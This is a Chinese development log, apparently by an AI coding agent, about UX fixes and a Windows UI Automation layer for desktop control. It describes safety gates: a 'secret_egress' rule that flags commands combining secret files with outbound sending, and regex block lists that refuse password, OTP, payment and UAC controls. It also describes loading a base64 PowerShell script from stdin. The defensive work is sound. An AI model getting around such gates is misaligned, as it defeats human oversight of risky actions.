这是这轮最重要的产出。前面六轮修的每一条**测试都不会失败**，因为没人断言
"这句话用户能读懂"。补上 5 条：

1. `test_no_english_only_user_messages` —— 用户可见提示不能整句英文（≥3 个英文
   单词就算）。排除 `/quit`、`Esc`、Textual 标记
2. `<字段名>` 占位符不能出现在用法里（用 `<批次号>` 不用 `<change_id>`）
3. 不能把原始 Python 容器（`[{`）打到界面
4. 不能出现 `key=value` 形式的原始参数
5. `/help` 不能出现 `TUI commands` / `ported` / `line REPL` / `Skills (`

判据只覆盖**流向显示层**的字符串，不看 docstring、不看 Textual 样式标记、不看
工具返回给模型的英文文案（模型侧英文更可靠，不在范围）。

以后再犯，CI 会直接挡住。

### 测试

`tests/test_ui_copy.py`（5 条守卫）+ 若干断言随文案更新。
全量 **2972 passed / 3 skipped**，ruff 通过。

## UX 打磨（七）：工具活动行——每次调用都出现，却暴露原始工具名且 GBK 不安全

继续扫飞书卡片与回合内文案。飞书卡片文案合格（中文、有下一步提示）。
问题在**工具活动行**：`tool_activity.format_line` 每次工具调用都打印一次。

### 三个问题

```
• bash  pytest -q  3.40s ✓
• desktop_snapshot  3.40s ✓          ← 原始工具名，且无参数摘要
• move_paths  3.40s ✓                ← 连"移什么"都没有
```

**（a）原始工具名。** 用户在转录里读到的是 `desktop_snapshot`、`move_paths`，
不是「看前台窗口」「移动文件」。

**（b）`•` `✓` `✗` 全部 GBK 不安全。** 实测三个字符都编不进 GBK——而
`harden_stdio()` 只保证不崩，于是**每一行工具活动都以 `\u2022` 开头**。
这是本轮第三次踩同一个坑（台账的 `✓✗◐`、`/audit` 的乱码、现在这里）。

**（c）新工具没有参数摘要。** `_PRIORITY` 里没有 `moves`/`text`/`when`，
所以 `move_paths`、`remember`、`remind` 在工具行上只有裸名字。

### 改法

```python
# 符号必须 GBK 安全
parts = [f'· {label}{" ↗后台" if background else ""}']   # 原 • → ·
parts.append(f'{elapsed:.2f}s {"×" if failed else "√"}')  # 原 ✗ ✓ → × √
```

`label` 用新加的 `approval_view.tool_name_zh()`——**只要中文名，不带原名**。
和审批面的 `tool_label()`（`看前台窗口 (desktop_snapshot)`）分开：审批面需要
原名对照日志，而活动行是单行、会被反复覆盖，塞原名会挤掉"已用时"。

`_PRIORITY` 补 `moves`/`text`/`when`/`batch_id`。同时修一个必然踩的坑：
`','.join(str(item) for item in value)` 在元素是 dict 时会打出
`{'from': 'a', 'to': 'b'}`——遇到 dict 元素改成 `3 项`。

现在的输出：

```
· 执行命令  ls -la  1.23s √
· 看前台窗口  1.23s √
· 移动/重命名文件  2 项  1.23s √
· 记住一条  周三不看代码  1.23s √
· 设置提醒  交周报  1.23s √
```

### 进度行也一并修

`turn_progress.format_progress_line` 同样用原始工具名：

```
⏳ 00:02 · 正在执行 desktop_snapshot      →  ⏳ 00:02 · 正在看前台窗口
```

顺带修了一个中文病句：工具名未知时 `tool_name_zh` 回 `工具`，直接拼会得到
**「正在工具」**。改成按兜底词切换动词（`正在使用工具`）。

### 守卫补第 6 条

`test_display_strings_are_gbk_safe`：用户可见文案必须能编码成 GBK。

这条把"第三次踩同一个坑"变成不可能——`✓ ✗ • ◐` 现在会被 CI 直接挡住，
并在失败信息里指出该用 `√ × · ~`。

### 测试

`test_ui_copy.py` +1（6 条守卫）、`test_tool_activity.py` / `test_turn_progress.py`
/ `test_cli_output.py` 断言随文案更新。
全量 **2973 passed / 3 skipped**，ruff 通过。

## UX 打磨（八）：审批卡片的「原因」是写给模型的英文

继续扫飞书卡片。`feishu_approval_card` 的详情已经用 `approval_view.detail`（中文），
但**原因那一行是英文**：

```
#1 · bash
原因: destructive command
```

这行来自 `Decision.reason`——**写给模型看的**，例如：

```
moves or renames files (reversible via undo_moves, but still changes the filesystem)
```

而用户正是在这一屏决定要不要批准。给他一句英文技术描述，等于没解释。

### 改法：按 code 映射，不按文本替换

`Decision` 本来就有稳定的 `code`（`destructive` / `move_paths` / `secret_egress`…），
只是它没被传到审批请求里。补上整条链路：

```
Decision.code → GATE.decide(code=…) → PermissionRequest.code → reason_zh()
```

`approval_view.reason_zh(code, reason)` 用 28 条映射给出人话：

| code | 中文 |
|---|---|
| `destructive` | 看起来是破坏性命令 |
| `opaque_command` | 命令里含有无法静态判断的部分（解释器、变量展开等） |
| `secret_egress` | 命令同时提到了秘密文件和对外发送 |
| `move_paths` | 要移动或重命名文件（可用 /undo-move 撤销） |
| `forget_memory` | 要永久删除一条记忆（不可恢复） |
| … | … |

没有映射时**退回原文**——宁可显示英文，也不丢掉信息。

现在卡片显示：

```
#2 · 移动/重命名文件 (move_paths)
原因: 要移动或重命名文件（可用 /undo-move 撤销）
```

**为什么不用文本替换**：`reason` 的措辞会随实现改动（改一个词就失效），而 `code`
是策略层的稳定标识。这也是 `/audit` 那次「用事件名映射」的同一条经验。

### 顺带修：纯文本回退版本用原始工具名

`approval_text()` 里是 `req.get('tool')`，而卡片版早就用 `tool_label()` 了。
两边不一致：卡片显示「操作键鼠」，文字版显示 `desktop_action`。

### 一处测试连带

`decide()` / `decide_queued()` 多了 `code=` 参数，6 个测试文件里的假审批函数签名
（`lambda tool, args, reason:`）不兼容，统一加 `**kw`。

### 全量

**2973 passed / 3 skipped**（206s），ruff 通过。

顺带记录一个测量教训：这次全量第一次跑在 38% 卡了 900s 没结束，重跑 206s 就完了
——是上一轮 aborted 的进程残留占着资源，不是测试挂了。**看到"卡住"先确认没有
残留进程**，再怀疑代码。

## UX 打磨（九）：飞书卡片——字段名当标签、原始英文状态、两个模块结论相反

继续扫飞书卡片与网关回复。这轮抓到 5 处，其中一处是**真 bug**。

### 真 bug：同一份数据，终端说「有效至」，飞书说「已过期」

`terminal_views._expiry_label` 与 `feishu_domain_card._expiry_label` 是同名同职责
的两份实现，但**默认值相反**：

```python
# terminal_views（旧）
if row.get('active', True):        # 缺字段 → 当「有效」
# feishu_domain_card（旧）
if row.get('active'):              # 缺字段 → 当「已过期」
```

`active` 是 `net_grants.list_rules()` 附带的**派生字段**，别的调用方（卡片、
测试、未来的 API）拿到的行可能没有它。于是**同一条域名规则，两个界面给出相反的
安全状态**——一个说「有效至 2026-12-31」，一个说「已过期（2026-12-31）」。

安全规则的生效状态不能靠一个可能缺失的字段推断。改成
`net_grants.expiry_label()` 作为唯一实现，**自己按日期算**，不看调用方。

### 内部字段名当标签

| 位置 | 泄漏 | 改法 |
|---|---|---|
| `cron_text` / `_job_lines` | `[recurring · 只读 · …]` | `[重复 · 只读 · …]` |
| `cron_text` | `可写` | `允许副作用`（安全相关属性要说明白） |
| `_push_label` | `推送→oc_chat1`（截断 8 字符，认不出是哪个群） | `推送到其他聊天` |
| `_task_line` | `exit=0` | `退出码 1`，且 **0 时不提**（正常退出不是噪声） |
| `domain_text` | `allow` / `deny` 字面量 | `允许` / `拒绝`（与终端版一致） |

### 原始英文状态值

`tasks_text` 直接显示 `completed` / `failed`：

```
OS-1 · completed · exit=0 · 用时 —
```

加 5 条状态映射（运行中/排队中/已完成/失败/已取消）。

### 认不出的异常直接抛给用户

```python
failed = ('处理未完成：' + (hint or str(exc)) + …)
```

`friendly_error()` 返回空串时（未识别的错误），用户看到的是
`处理未完成：openai.APIStatusError: Error code: 500 - {'error': …}`。

**原始异常不能当主文案**。改成：人话打头（`模型或服务返回了意外错误。`），
原始信息留在「技术细节：」里供反馈，两者都截断 300 字。

### 守卫补到 13 条

新增 `test_field_names_are_not_used_as_labels`（7 个模块参数化）：内部字段名
（`recurring` / `exit_code` / `session_id`…）不能当显示标签，`exit=` / `type=`
这类 kv 形式不能出现在文案里。

### 测试

全量 **2980 passed / 3 skipped**（207s），ruff 通过。

## UX 打磨（十）：并排对照终端与飞书，找「同一功能两个结论」

前九轮都是"读代码找泄漏"。这轮换了方法：**把同一功能的终端输出与飞书输出并排
渲染**，专门找不一致。这个方法比读代码有效得多——三条不一致里有两条是靠并排
看出来的，读单个模块时都是"正确"的。

### 不一致 1：`/audit` 终端中文，飞书英文

```
终端：  01-01 08:00:00 策略拒绝  tool=bash  code=destructive  x
飞书：  ⛔ 01-01 08:00:00  policy_denied
        bash · destructive · x
```

上一轮我只给 `terminal_views` 加了 `_AUDIT_LABELS`，忘了飞书卡片是**另一份实现**。

改：把标签表搬到 `audit.EVENT_LABELS`，两处共用。顺带修了 `_detail` 里
`scope` 的 `allow`/`deny` 字面量 → 允许/拒绝。

### 不一致 2：`/approvals` 终端原始工具名 + 英文原因

```
终端：  1. move_paths · moves or renames files
飞书：  #1 · 移动/重命名文件 (move_paths)
        原因: 要移动或重命名文件（可用 /undo-move 撤销）
```

同一批待审批请求，飞书是中文、终端是英文。上一轮我修的是 `feishu_approval_card`，
**没回头看 `status_report.format_pending_approvals`**。

改：终端版也用 `tool_label()` + `reason_zh(code)`。

### 我自己引入的 bug，下一个手动检查就抓到

修完上面那处，我顺手把 `tool` 变量改成了标签，然后：

```
待审批操作：
  1. 移动/重命名文件 (move_paths) · 要移动或重命名文件…
       moves=[{'from': 'a', 'to': 'b'}]        ← 又变回原始 dict
```

原因：`detail(tool, args)` **按原始工具名分支渲染**，传标签匹配不上，退化成
`_pairs(args)`。

这类"参数类型错就静默退化"的接口很危险——它不报错，只是悄悄降级。补了一条
断言把行为钉住（`test_detail_requires_raw_tool_name_not_label`）。

### 教训

**修一处必须搜同类实现。** 前九轮修的多数是"一个功能两处实现"：
`_expiry_label`（终端/飞书）、`_AUDIT_LABELS`（终端/飞书）、
`format_pending_approvals` / `approval_text`（终端/飞书）、
`cron_text` / `_job_lines`（同一文件内两份）、`_render_memory`（memory 内两份）。

这个仓的界面层没有单一的渲染入口，终端与飞书各写一份是历史形成的。**并排对照
是发现它们的唯一可靠办法**——读任何单独一份都看不出问题。

### 测试

全量 **2981 passed / 3 skipped**，ruff 通过。

## UX 打磨（十一）：`/sessions` 飞书卡片丢了会话内容预览

并排对照最后一对功能：`/sessions` 的终端 vs 飞书。

```
终端：  网关重构
          工作区：工作目录未记录
          最近：网关重构的请求路由        ← 有预览
          最近活跃：刚刚

飞书：  2. 网关重构
          已绑定 · 最近活跃 刚刚         ← 没有预览
```

**飞书卡片只有标题，没有预览。** 而标题是自动生成的——`新会话`、`怎么跑测试`
这类标题认不出"这会话到底聊的是什么"。终端那边早有这条信息。

改：加上 `最近：<预览>`，规则与终端一致（**预览与标题相同时不重复**，避免两行
一模一样）。截断 100 字。

### 一个反复出现的操作失误

这次改动的 `str.replace` 又没命中（`\n` 在 heredoc 里被折叠成真换行），我先看到
"没生效"又不知道原因，只能回去 `sed -n` 看文件确认。这个坑在这一轮里出现了
**四次**（改 `feishu_sessions`、改 `prompt_assembly`、改 `terminal_views`、
改 `status_report`）。

后来的做法固定成：**含 `\n` 或多行字符串的替换一律用 `edit` 工具或
`chr(10).join(...)`**，不用 heredoc + `str.replace`。

### 十一轮下来，「一个功能两处实现」的完整清单

| 功能 | 终端 | 飞书 | 是否已对齐 |
|---|---|---|---|
| 域名有效期 | `terminal_views._expiry_label` | `feishu_domain_card._expiry_label` | ✅ |
| 审计事件名 | `terminal_views._AUDIT_LABELS` | `feishu_audit_card.event_line` | ✅ 共用 `audit.EVENT_LABELS` |
| 待审批列表 | `format_pending_approvals` | `approval_text` | ✅ |
| 审批原因 | 同上 | 同上 | ✅ 共用 `reason_zh(code)` |
| cron 行 | `cron_text` | `_job_lines`（同文件） | ✅ |
| 任务状态 | `tasks_text` | `_task_line`（同文件） | ✅ |
| 会话列表 | `session_label` | `list_card` | ✅ 这轮补上预览 |
| 记忆渲染 | `_render_memory` | `_render_entry`（同文件） | ✅ 共用 |

八对全部对齐。**这八对里没有一对是靠测试发现的**——测试各自测各自都通过。

### 测试

全量 **2981 passed / 3 skipped**，ruff 通过。

## UX 打磨（十二）：CLI 补全比 TUI 少 14 个命令

用户指出「CLI 命令提示好像没跟上」。核对后发现是**两份命令表**：

```
cli_commands.COMMANDS   34 个   ← CLI 补全、CLI help
ui.commands.COMMANDS    48 个   ← TUI 命令面板
```

TUI 有的、CLI 补不出来的 **14 个**：

```
/memories  /improvements  /usage  /undo-move    ← 我这几轮新加的，全中
/allow  /deny  /ask                              ← 会话级工具策略
/hotkeys  /clear  /more  /copy  /dequeue
/clone  /export
```

后果：在 CLI 里敲 `/mem` 什么都不补，敲错也没有「是否想输入」提示（那个提示也查
这份表）——**用户只能靠记忆敲全名**。

### 补法

给 `cli_commands.COMMANDS` 补上这 14 条（含参数提示、说明、分组）。现在两边都是
48 条，命令名集合完全一致（CLI 多出来的只有 `/n` `/p` `/w` `/s` `/r` `/cp`
这类别名）。

验证：

```
/mem    -> ['/memories']
/imp    -> ['/improvements']
/usa    -> ['/usage']
/undo-m -> ['/undo-move']
/all    -> ['/allow']
```

### 加守卫

`test_cli_and_tui_command_sets_match`：TUI 命令面板里的每一条都必须也能在 CLI
补全里找到。

这条特别值得加，因为**两份表没有共同的注册点**——`cli_commands.Command` 与
`ui.commands.CommandSpec` 是两套 dataclass，谁都不知道对方存在。以后再加命令，
只改一边就会静默漂移，而两边各自的功能测试都通过。

### 这是「一个功能两处实现」的第九对

前十一轮梳理过八对（有效期、审计标签、待审批、审批原因、cron 行、任务状态、
会话列表、记忆渲染），这次是**命令注册表**这一对。同一类问题，只是这次的后果
不是"显示不一致"而是**功能缺失**（补不出来）。

### 测试

全量 **2982 passed / 3 skipped**，ruff 通过。

## 命令语义梳理：又一处「没跟上」+ 4 处别名关系 + 分组重排

按用户要求检查 48 个命令的冗余与语义。先发现**又一个跟上轮同类的缺陷**，
再做语义整理。

### 缺陷：`/help` 硬编码了 4 个组名，7 个命令从不显示

```python
for group in ('常用', '会话', '工作区', '快照'):   # ← 写死
```

新增的「记忆」「文件」「安全」三组共 **7 个命令**在 CLI `/help` 里根本不存在：

```
/memories  /improvements  /usage  /undo-move  /allow  /deny  /ask
```

和上轮「CLI 补全少 14 个」是同一个病根：**新加东西时只改了"数据"，没改"读取数据
的那段代码"**。上轮是补全查了旧表，这轮是 help 遍历了旧组名。

改：按命令出现顺序推导组名，未知组照常显示（`preferred` 只决定顺序，不决定
是否显示）。现在 `/help` 列出全部 48 条。

### 4 处「看起来两个功能，其实是同一个」

| 命令 | 真实关系 | 改后的说明 |
|---|---|---|
| `/clone` | ≡ `/fork` 不带序号（同一个 `_fork_to(None)`） | `同 /fork：从当前叶复制出新会话` |
| `/undo` | ≡ `/rewind turn --yes`（源码里就是字面替换） | `快速回滚最近一回合（= /rewind turn --yes，不预览）` |
| `/workspace` | 不带参数 ≡ `/workspaces` | `登记/命名/移除工作区；不带参数同 /workspaces` |
| `/sessions` | TUI 里与 `/resume` 调同一个 picker | `列出/选择会话（与 /resume 同界面）` |

这四条**不删**（删了破坏肌肉记忆和 README），但把关系写进描述——用户能知道
"敲哪个都一样"，而不是以为错过了一个功能。

`/undo` 那条尤其值得写清：它是 `/rewind turn --yes`，**跳过预览直接回滚**。
原来只说"撤销最近一个用户回合的文件和会话改动"，看不出它比 `/rewind` 少了确认
步骤。

### 分组重排：权限命令原来 8 个散在「常用」

```
改前：常用 23 | 会话 10 | 工作区 4 | 快照 4 | 记忆 3 | 文件 1 | 安全 3
改后：常用 17 | 会话 10 | 安全 10 | 工作区 4 | 快照 4 | 记忆与自我改进 2 | 文件 1
```

三处调整：

1. **把 7 个权限命令挪进「安全」**：`/revoke` `/grants` `/domains` `/audit`
   `/rules` `/sandbox` `/approvals`。它们和 `/allow` `/deny` `/ask` 是同一族，
   原来后者在「安全」、前者在「常用」，用户找不到。
2. **`/usage` 移出「记忆」**：它是看成本的常用命令，和记忆没有关系。
3. **「记忆」改名「记忆与自我改进」**：`/memories` 与 `/improvements` 都是
   "agent 对自己的认知与调整"，同一个语义族。

### 一个自我观察

这轮的缺陷（`/help` 漏 7 个）和上轮（补全漏 14 个）**根因完全相同**：

> 数据（命令表）在增长，读取数据的硬编码列表没跟着长。

上一轮我加了「CLI 与 TUI 命令集合一致」的断言，但那条断言查的是**两份数据表**，
查不到「渲染时用了硬编码子集」。这轮补的是**从数据推导**，而不是再断言一次。

### 测试

全量 **2982 passed / 3 skipped**，ruff 通过。


---

# 第 24 部分：桌面感知——从"只看焦点"到"看得见控件"（新增）

## 问题 1：动作面够用，感知面是 2023 年的

对着 Codex / dots / Muse 的差距做完调研（`docs/DESKTOP_CONTROL_RESEARCH.md`），
结论不在动作层：坐标点击、键入、组合键、滚动、序列、敏感窗口拦截、终端保护、
pid+hwnd 双因子、每步前台复核——这些我们已经比多数开源工具严。

问题在**模型怎么知道点哪儿**。`desktop_snapshot` 只返回前台窗口的**当前焦点元素**
（名字 + 控件类型），没有界面元素树。要找"保存"按钮，只有两条路：

- 截图自己估像素坐标；
- `screen_capture` → `screen_ocr` → 从 bbox 反算坐标（3 次调用 + 多次审批，
  而且 OCR 只覆盖文字，图标按钮完全无解）。

菜单、下拉、列表项、Tab 页、树节点**都无法枚举**，只能盲点。

### 证据：这不是"够用"，是数量级差距

同一模型、同一任务、只换观察方式（OSWorld 论文 Tab.5，Ubuntu 桌面，15 步上限）：

| 观察方式 | GPT-4 | GPT-4o |
| --- | --- | --- |
| 只有无障碍树 | **12.24%** | **11.36%** |
| 截图 + 无障碍树 | 12.17% | 11.21% |
| 只有截图 | 5.26%(4V) | 5.03% |

无障碍树是截图的 **2.2~2.3 倍**，而且"树 + 截图 ≈ 只有树"——信息量在树里。
Windows 上（WindowsAgentArena）：像素检测 8.6% → 加 UIA 树 13.1%。

还有一个更工程化的理由：OSWorld 的扰动实验里，只改窗口大小，成功率从 50.79%
掉到 **15.04%**。按像素坐标点，布局一动就全错；按元素编号点，布局动了也照样对。

## 方案：`desktop_inspect` + 元素级动作

### 1. 裁剪过的控件清单，不是全量树

全量 UIA 树是几十万 token（OSWorld 论文原话："上百万 tokens"），OSWorld 的做法是
过滤后转成紧凑表格。我们的做法：

- 前序遍历，`ControlViewCondition`（服务端就把布局元素滤掉）；
- 节点数 / 深度 / 时间三重预算（默认 120 / 12 / 2500ms，可用环境变量调）；
- 只列"有趣的"节点：有名字、可交互、可聚焦、有值；纯容器只下探不占行；
- 控件类型翻成中文（按钮/输入框/列表项/选项卡…），密码框只显示"已隐藏"；
- 输出**紧凑文本**，每行 `#3 输入框 "搜索" · 内容 "wifi" (10,50,300,28)`。

### 2. 动作按编号，不按坐标

`desktop_action(action='element', element=3, operation='invoke', tree=<指纹>)`
走 UIA 的 Invoke / SetValue / Toggle / SelectionItem / ExpandCollapse / Focus。
不移动鼠标、不抢焦点、不怕遮挡和 DPI，而且能读回控件值做验证。

**指纹是必填的**：`desktop_inspect` 返回一个结构指纹（编号 → 类型/名字/位置的哈希），
动作前重算一遍，不一致就拒绝。界面在"看一眼"和"点一下"之间变了，旧编号会指向
另一个控件——这种事不该靠模型自觉。

### 3. 第四档延伸到界面

`never_do` 原来按命令词和参数文本匹配，对"点一个写着『修改密码』的按钮"完全无效。
新增 `ui_forbidden_patterns()`：控件名命中密码 / 验证码 / 支付 / 提权就直接拒，
不进审批队列。密码框的 `setvalue` 在 UIA 层再拒一次（读都不读它的值）。

## 踩过的坑（六个，全是实测抓出来的）

### 坑 1：`CacheRequest` 对 `TreeWalker` 拿到的元素无效

文档说缓存请求能把"每个属性一次跨进程调用"批量成"一次调用拿全部属性"。照做之后
所有控件的类型和名字都是空串：

```
root cached type:  (空)
child 1 cached: type='' name=''
```

换成 `.Current` 逐个读就有值——说明缓存的**元素是对的，缓存值没填**。真正生效的是
`$el.GetUpdatedCache($cache)`：对每个元素显式调一次，一次拿回全部属性 + 模式表。
实测边际成本：原生应用 1-10ms/节点，Chromium 首次 500ms、之后 10-17ms。

### 坑 2：`GetCachedPattern` 在"控件不支持该模式"时抛异常

绝大多数控件不支持大部分模式，于是 5 个模式 × 每个节点 = 5 个异常。
异常构造占了遍历时间的一半以上：**38ms/节点 → 9ms/节点**（换 `TryGetCachedPattern`）。

### 坑 3：缓存模式里的属性值恒为空

`$pattern.Cached.Value` 永远是空串，`$pattern.Current.Value` 才对。缓存请求只缓存
"这个模式存不存在"。所以值的读取退回 `Current`，只对输入类控件多付一次调用。

### 坑 4：`FindAll(Subtree)` 在 PDF 页面上是 32 秒

实测一个 PDF 阅读器窗口：`FindAll(Children)` 只有 2 个子节点（12ms），但整棵子树
**26154 个节点，32.6 秒**。所以绝不能"一次拉全树再过滤"，必须前序遍历 + 早停。

配套两条：`GetNextSibling` 在 Chromium 上约 25ms，改成 `FindAll(Children)` 一次
拿全部子节点；文档（网页正文 / PDF 页面）单独限额 40 个节点——网页里的链接和输入框
都在 Document 下面，不能整个跳过，但不能让它淹掉工具栏。

### 坑 5：脚本 41KB，超过 Windows 命令行上限

加完这些 PS 代码，worker 启动直接 `WinError 206`（文件名或扩展名太长）：
Windows 命令行上限 32767 字符，而脚本已经 41KB。

改成**引导脚本 + 标准输入**：`-Command` 只传一个 10 行的引导块，真正的脚本作为
第一行 base64 从 stdin 读进来再 `[scriptblock]::Create`。用 `Create` 而不是
`Invoke-Expression`，因为前者的 `$script:` 作用域属于这个 scriptblock 自己，
函数之间共享状态的行为和真实 .ps1 一致（已实测）。

顺带把独立进程模式（worker 降级路径）也改了——它原来同样撞上限。

### 坑 6：控件名里有零宽字符

实测某个控件名带 U+200B。GBK 控制台只能吐 `\u200b` 转义串。工具层加了一道
`_clean()`：去零宽/方向标记、去控制字符、丢掉 GBK 编不了的字符。

### 坑 7：heredoc 把反斜杠加字母折叠成控制符，规则静默失效

`never_do` 里给界面控件写的正则用 `\bpay\b` / `\botp\b` / `\buac\b` 防止误伤。
用 heredoc 写进文件后，这几个变成了真正的退格符（0x08）：

```
'(?i)...|<BS>otp<BS>|2fa|...'      # 永远匹配不到
```

规则看着还在，测试也绿——因为测试只验了「转账」「验证码」这些中文分支。
后来把 `'OTP'` / `'Pay now'` / `'UAC prompt'` 加进用例表才暴露。
修法是换成定宽前瞻 `(?<![a-z])otp(?![a-z])`，并加一条**守护断言**：
规则里不允许出现任何控制字符。

这一类坑这个项目已经踩了第五次（换行符三次、这次的退格符）。结论写进纪律：
**含转义序列的字符串一律用 `edit` 工具或 `chr()` 拼，不要过 heredoc。**

## 实测数字

| 窗口 | 控件数 | 遍历耗时 | 备注 |
| --- | --- | --- | --- |
| 自建 WPF 测试窗（4 个控件） | 4 | 211ms | 类型、名字、模式全对 |
| WindowsTerminal | 5 | 113ms | |
| Chrome（真实网页） | 79 | 1208ms | 含页面链接、复选框、Tab |
| Edge（PDF，26154 节点） | 40 | 1595ms | 文档限额生效，未跑满时间预算 |
| 资源管理器（zip 视图） | 1 | 48ms | 该窗口确实不暴露 UIA 项（RawView 也只有 2 个） |

端到端验证（自建 WPF 窗口）：`setvalue` 写入中文读回一致、`invoke` 触发按钮回调
（窗口标题变化）、界面变化后指纹变化、未知操作被拒。

## 已知限制（明确写下来）

- **控件类型不是权威的**。走 MSAA 兼容层的应用（部分 WinForms / 老程序）会把
  按钮和输入框都报成 `Pane`，也不提供 Invoke/Value 模式——这类界面只能退回坐标点击。
  这也是保留坐标点击的原因。
- **自绘界面没有树**（游戏、Canvas、部分 Electron）。此时工具会如实说"没有可读的
  控件"，并建议改用截屏 + 坐标。
- **仍然是"先看后点"**：界面在两步之间变化会触发 `tree_changed`，模型要重新看一眼。
  这是刻意的（比点错控件好），但多一轮往返。

## 收获

> **感知的精度决定动作的精度。** 动作层再严，模型拿不到"可点的东西在哪"，就只能猜；
> 而 75% 以上的失败步骤是点错位置——把这一步换成"按编号点"，等于直接消灭头号失败模式。

> **文档里的"最佳实践"要实测。** CacheRequest 的三条行为（对 walker 无效、抛异常、
> 缓存值恒空）文档都没写清，全是实测抓出来的。三条加起来是 38ms → 9ms 的差距。

> **上限要设三层**：节点数、深度、时间。只设节点数挡不住"节点很少但每个都很贵"，
> 只设时间挡不住"递归很深栈爆掉"。


---

# 第 25 部分：等一个条件、看得见坐标、知道动作有没有生效（第二期）

第一期解决了"看得见控件"，但循环里还缺三块：**什么时候该做下一步**、**截图上的
文字对应屏幕哪个点**、**这一步到底生没生效**。

## 问题 1：没有等待，只能 sleep + 重新快照

点了"保存"之后弹进度条、开新窗口、Toast 提示，这些都要时间。模型的应对只有
`sleep` 然后重新 `desktop_snapshot`——每个回合一次审批、一次往返，而且它并不知道
该等多久：等短了读到旧界面，等长了白烧时间。

### 方案：轮询放进一次工具调用里

`desktop_wait`：在 PowerShell 内部循环，一次调用顶掉好几轮往返。

```
target=control   前台窗口里等某个控件出现/消失（每次轮询重新遍历树）
target=window    等某个顶层窗口的标题出现/消失（30-50ms 一轮，100ms 间隔）
target=foreground 等前台窗口的标题出现/消失
state=present|absent
timeout_ms       200-30000，默认 5 秒
```

判据和 `desktop_inspect` 完全一致（同一套裁剪逻辑），所以"等到了"的那个控件
可以直接拿去 `desktop_action` 点——返回里带编号和指纹。

实测（自建 WPF 窗口）：

| 场景 | 结果 |
| --- | --- |
| 窗口已存在，等它出现 | 命中，1 次轮询，58ms |
| 等一个不存在的标题，预算 600ms | 未命中，5 次轮询，668ms |
| 点按钮后等旧标题消失 | 命中，2 次轮询，183ms |
| 等不存在的控件，预算 500ms | 未命中，4 次轮询，526ms |

## 问题 2：截图上的坐标和 `desktop_action` 的坐标不是一个东西

`screen_ocr` 给的是**图像像素** bbox，`desktop_action` 要的是**绝对屏幕坐标**。
中间差一个截图原点（多显示器、region 裁剪、缩放都会变）。这个信息在
`screen_capture` 里当时是知道的，但**没落盘**——等模型过几轮再调 OCR，就丢了。

文档里一个字都没提，模型只能自己猜。这是必然踩的坑，而且错了就是点偏。

### 方案：边车文件 + 直接给可点的坐标

- `save_png()` 额外写一个同名 `.json` 边车：`{origin: [x, y], width, height,
  screen, region, sha1, captured_at}`；`prune()` 连着边车一起清；
- `Capture` 多一个 `origin` 字段（截图像素 (0,0) 对应的屏幕坐标）；
- `screen_ocr` 读边车，**每行直接给出中心点的屏幕坐标**：

```
每行的 @(x,y) 是该行中心点的屏幕坐标，可以直接给 desktop_action 当 x/y 用；
方括号里是图像内的 bbox x,y,w,h。截图原点 (120,80)。

1. @(180,109) [10,20,100,18] 保存
```

- 没有边车时（老截图、手动放的图）如实说"bbox 只能按图像像素理解"，
  而不是给一个看起来能用、其实点偏的坐标；
- `desktop_action` 的 `x`/`y` 描述从"inside the target window"改成
  "absolute screen pixel（和截图同一坐标系），且必须落在目标窗口内"。

## 问题 3：动作发出去了，但没人知道生效没有

`desktop_action` 原来只返回动作后的状态，模型无法判断"这一步成功了吗"。
截图路线的工具都会在动作后附一张新图（Claude 的提示词直接要求"每步之后截图并
说明是否成功"），我们连焦点变化都不报。

### 方案：报三个能确定的信号

`ActionResult` 多一个 `before`（PowerShell 本来就回 `state_before`，只是没解析），
工具层比对前后：

- 前台窗口换了 → 「前台窗口换成了『X』。」
- 焦点元素变了 → 「焦点从『搜索』变成『保存』。」
- 窗口标题变了 → 「窗口标题变成了『X』。」
- 都没变 → 「焦点和前台窗口都没变；**这不代表目标控件没响应**，必要时用
  desktop_inspect 确认。」

最后那句是刻意的：物理输入只能看到前台窗口和焦点，看不到按钮有没有按下。
说"没有变化"会被模型读成"失败了"然后重试，说"没变也不代表失败"才是事实。

## 踩过的坑

### 坑 1：`[string]$bool` 是 `'False'`，而非空字符串在 PowerShell 里是真值

窗口等待的判断写成了：

```powershell
if ([string]$window.title.ToLowerInvariant().Contains($needle)) { $lastHit = $window }
```

`[string]` 把 `$false` 转成字符串 `'False'`，于是**每个窗口都算命中**：

- 等一个不存在的标题 → 立刻 matched=true（1 次轮询，20ms）
- 等旧标题消失 → 永远等不到（23 次轮询跑满 3 秒）

两个症状方向相反，很难一眼看出是同一个 bug。修法是先取字符串再调方法：

```powershell
$title = [string]$window.title
if ($title.ToLowerInvariant().Contains($needle)) { ... }
```

讽刺的是**同一段逻辑在调试脚本里是对的**（我那里没加 `[string]` 转换），
所以"复制出来跑一遍"反而更糊涂。最后还是靠"两种症状必须来自同一行代码"这个
推理找到的。

powershell 没法被 pytest 直接单测，所以加了一条守卫：
**脚本里不允许出现 `[string]` 与 `.Contains(` 同行**（注释除外）。

### 坑 2：常量重名，值被后定义的那组覆盖

新加的 `MIN_WAIT_MS = 200` / `MAX_WAIT_MS = 30000` 和文件里早就有的
"序列 wait 步骤"用的 `MIN_WAIT_MS = 50` / `MAX_WAIT_MS = 3000` 撞名，
后者在后面，于是等待工具的超时永远被卡在 50~3000ms。测试直接报
"timeout_ms must be between 50 and 3000"，一眼可见——这次运气好。

改名成 `TOOL_WAIT_MIN_MS` / `TOOL_WAIT_MAX_MS`，并在注释里写明两者的区别
（单步等动画 vs 等条件成立的总预算）。

## 收获

> **"等"是一等公民。** 没有它，agent 要么等太短读到旧界面，要么用 sleep 烧掉
> 好几轮审批。把轮询放进工具内部，是把"时间"从模型手里收回到工具手里。

> **跨工具的坐标系必须显式传递。** 截图知道原点、OCR 不知道、动作又需要——
> 这三者之间没有任何隐式约定，中间丢一个字段就是"点偏 200 像素"。

> **报告"我看到了什么"而不是"我做了什么"。** 动作接口能确定的只有它观察到的
> 东西；把"没看到变化"说成"没生效"，模型就会开始瞎重试。


---

# 第 26 部分：给桌面感知做 profile —— 三处热点的真相

前两期把 `desktop_inspect` / `desktop_wait` / 元素动作做出来了，但没人量过它们多快、
占多少内存。先建一个脚本（`scripts/profile_desktop.py`），再决定优化什么。

```
python scripts/profile_desktop.py            # 全部
python scripts/profile_desktop.py walk       # 逐窗口遍历（不需要抢前台）
python scripts/profile_desktop.py api        # 真实 worker 链路（要前台窗口）
python scripts/profile_desktop.py memory     # Python 侧内存与泄漏
python scripts/profile_desktop.py tokens     # 回包与 token 成本
```

## 量出来的四件事

### 1. 固定开销比想象中大：`Get-WindowState` 44ms/次

